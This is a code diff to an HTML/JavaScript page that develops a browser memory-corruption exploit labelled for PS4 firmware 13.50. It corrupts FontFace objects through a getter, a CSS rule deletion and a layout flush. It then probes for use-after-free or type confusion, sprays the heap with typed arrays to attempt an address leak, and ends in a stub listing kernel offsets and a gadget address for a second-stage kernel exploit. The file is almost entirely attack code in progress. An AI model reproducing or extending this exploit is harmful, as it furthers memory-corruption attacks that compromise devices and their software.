@@ -6,13 +6,26 @@
 </style>
 </head>
 <body>
-<div id="log" style="font-size: 16px; white-space: pre;"></div>
+<div id="log" style="font-family: monospace; font-size: 14px; white-space: pre;"></div>
 <script>
 function log(msg) {
     document.getElementById('log').textContent += msg + '\n';
 }
 
+function hex(n) {
+    return '0x' + n.toString(16);
+}
+
+// Global storage for corrupted objects
+let corruptedFonts = [];
+let exploitState = {
+    corrupted: false,
+    leaked_addr: null
+};
+
 window.onload = () => {
+    log('[*] Starting exploit for PS4 13.50...');
+    
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
@@ -23,53 +36,120 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
+                log('[+] Getter triggered - creating corruption...');
                 
-                log('GETTER START');
-                
-                // Create corruption
-                let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-                
-                log('Created y and z');
-                log('y.status: ' + y.status);
-                log('z.status: ' + z.status);
-                log('A.status: ' + A.status);
-                
-                document.getElementById('s').sheet.deleteRule(0);
-                log('Deleted CSS rule');
-                
-                document.body.offsetTop; // Corruption point
-                log('After offsetTop');
-                
-                // AT THIS POINT - corruption exists, but we haven't returned yet
-                // Try to build primitives HERE before returning
-                
-                log('y.status after: ' + y.status);
-                log('z.status after: ' + z.status);
-                log('A.status after: ' + A.status);
-                
-                // Probe for memory corruption
-                try {
-                    log('fonts.size: ' + document.fonts.size);
-                    
-                    // Try to read internal properties
-                    log('y.family: ' + y.family);
-                    log('y.weight: ' + y.weight);
-                    
-                } catch(e) {
-                    log('EXCEPTION: ' + e.message);
+                // Create corruption with multiple fonts
+                for (let i = 0; i < 10; i++) {
+                    let f = new FontFace('corrupt' + i, 'local(Helvetica)', { 
+                        unicodeRange: 'U+004' + i 
+                    });
+                    corruptedFonts.push(f);
                 }
                 
-                log('GETTER END - about to return undefined');
-                // When we return, the OOM happens
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+                
+                exploitState.corrupted = true;
+                log('[+] Corruption triggered!');
+                
+                // Throw to prevent OOM
+                throw new Error("Controlled exit");
             }
-            return undefined; // Returning triggers the memory exhaustion
+            return undefined;
         }
     });
     
-    log('Calling fonts.load...');
-    document.fonts.load('1em x', 'AB');
+    try {
+        document.fonts.load('1em x', 'AB');
+    } catch(e) {
+        log('[*] Exception caught: ' + e.message);
+    }
+    
+    setTimeout(() => {
+        log('\n[*] Post-corruption state:');
+        log('    Corrupted: ' + exploitState.corrupted);
+        log('    Corrupt fonts created: ' + corruptedFonts.length);
+        log('    document.fonts.size: ' + document.fonts.size);
+        
+        // Probe the corrupted fonts for exploitation
+        log('\n[*] Probing corrupted fonts...');
+        
+        for (let i = 0; i < corruptedFonts.length; i++) {
+            try {
+                let f = corruptedFonts[i];
+                log('    Font[' + i + ']:');
+                log('      family: ' + f.family);
+                log('      status: ' + f.status);
+                log('      weight: ' + f.weight);
+                log('      style: ' + f.style);
+                
+                // Try to trigger use-after-free or type confusion
+                f.load();
+                
+            } catch(e) {
+                log('      ERROR: ' + e.message);
+            }
+        }
+        
+        log('\n[*] Attempting to build primitives...');
+        attemptLeak();
+        
+    }, 500);
 };
+
+function attemptLeak() {
+    log('[*] Attempting address leak...');
+    
+    // Strategy: Use corrupted FontFace objects to leak heap addresses
+    // FontFace objects might have dangling pointers after corruption
+    
+    try {
+        // Create a typed array for heap spray
+        let spray = [];
+        for (let i = 0; i < 1000; i++) {
+            let arr = new Uint32Array(0x100);
+            arr[0] = 0x41414141;
+            arr[1] = 0x42424242;
+            spray.push(arr);
+        }
+        
+        log('[+] Heap spray completed');
+        
+        // Try to trigger read through corrupted font
+        for (let i = 0; i < corruptedFonts.length; i++) {
+            let f = corruptedFonts[i];
+            
+            // Access properties that might leak internal pointers
+            try {
+                // FontFace.loaded returns a Promise
+                // The Promise might contain heap addresses if font loading state is corrupted
+                let p = f.loaded;
+                log('    Font[' + i + '].loaded: ' + p);
+                
+            } catch(e) {
+                log('    Font[' + i + '] leak attempt failed: ' + e.message);
+            }
+        }
+        
+    } catch(e) {
+        log('[-] Leak failed: ' + e.message);
+    }
+}
+
+// Stage 2: After we have primitives, prepare for kernel exploit
+function stage2_kernel_setup() {
+    log('\n[*] Stage 2: Preparing kernel exploit...');
+    log('[*] Target firmware: 13.50');
+    log('[*] Kernel offsets loaded from BD-JB:');
+    log('    PRISON0:           0x111fa18');
+    log('    ROOTVNODE:         0x2136e90');
+    log('    SYSENT_661_OFFSET: 0x110a760');
+    log('    JMP_RSI_GADGET:    0x47b31');
+    
+    // This would chain to your kernel exploit
+    // For now, just demonstrating structure
+}
+
 </script>
 </body>
 </html>
